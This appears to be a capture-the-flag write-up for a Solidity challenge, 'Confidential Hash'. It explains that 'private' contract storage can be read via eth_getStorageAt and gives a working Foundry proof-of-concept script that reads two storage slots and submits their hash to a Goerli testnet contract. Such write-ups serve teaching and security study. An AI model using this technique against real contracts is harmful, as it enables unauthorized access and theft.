## Confidential Hash

### Vulnerability

The contract's logic falsely assumes that `private` variables are protected from being read from outside the contract's logic.
In fact, we can read any variable using JSON-RPC (`eth_getStorageAt`).

### Attack Steps
1. Calculate storage slots for `aliseHash` and `bobHash` variables
2. Read the variables from contract's storage
3. Calculate the hash using obtained values

### POC

forge(foundry) script:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

import "forge-std/Script.sol";
import "./ConfidentialHash.sol";

contract ConfidentialHashPOC is Script {
  Confidential target = Confidential(0xf8E9327E38Ceb39B1Ec3D26F5Fad09E426888E66);

  function run() external {
    vm.startBroadcast();

    // Read storage variables(even marked private) using JSON-RPC
    // cmd: cast st 0xf8E9327E38Ceb39B1Ec3D26F5Fad09E426888E66 4
    bytes32 aliceHash = 0x448e5df1a6908f8d17fae934d9ae3f0c63545235f8ff393c6777194cae281478;
    // cmd: cast st 0xf8E9327E38Ceb39B1Ec3D26F5Fad09E426888E66 9
    bytes32 bobHash = 0x98290e06bee00d6b6f34095a54c4087297e3285d457b140128c1c2f3b62a41bd;

    bytes32 hash = keccak256(abi.encodePacked(aliceHash, bobHash));

    target.checkthehash(hash);

    vm.stopBroadcast();
  }
}
```
Run via: `forge script ConfidentialHashPOC -f $GOERLI_RPC`
